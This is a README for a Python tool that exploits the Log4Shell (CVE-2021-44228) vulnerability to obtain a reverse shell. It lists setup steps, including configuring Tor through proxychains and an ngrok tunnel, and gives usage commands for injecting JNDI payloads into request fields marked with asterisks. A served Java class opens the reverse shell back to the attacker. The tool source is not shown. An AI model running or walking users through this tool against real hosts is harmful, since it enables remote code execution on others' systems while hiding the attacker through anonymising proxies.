# **Log4Shell/CVE-2021-44228 - Reversing shell**  

### Exploitation vectors and affected Java runtime versions: https://mbechler.github.io/2021/12/10/PSA_Log4Shell_JNDI_Injection/   
### This application uses the LDAP server created by https://github.com/mbechler/marshalsec

## **Disclaimer**
All information and code is provided solely for educational purposes and/or testing your own systems for these vulnerabilities.

## **Requirements**
* Python3
* Java JDK any version
* Maven required
```
sudo apt-get update
```
```
sudo apt-get -y install maven
```
* Ngrok required
```
sudo apt-get -y install ngrok
```
* Tor required
```
sudo apt-get -y install tor
```
Edit file /etc/proxychains4.conf. Add socks5  127.0.0.1 9050 to the end of file.
```
echo 'socks5  127.0.0.1 9050' >> /etc/proxychains4.conf
```
* Ncat required

## **Usage**

This application creates an environment and automatically configures the parameters for vulnerability testing.
It starts an LDAP server and sends requests to the vulnerable host, which can be used remotely through ngrok tunneling and also through the tor proxy.

Running with the ncat listen option will also create an http server that will provide a java class for the reverse shell.

Use * in the fields where the commands must be injected.

Use the same notation for the parameters as in the curl command.

```
getrevlog4shell.py -X POST -H "Content-Type: application/json" -d '{"username":"*","password":"*"}' -v <host_vulnerable>
```

It can also be used the files originated from the burpsuit edited with the insertion of * in the fields to be tested.

```
getrevlog4shell.py -r <burp_file>
```
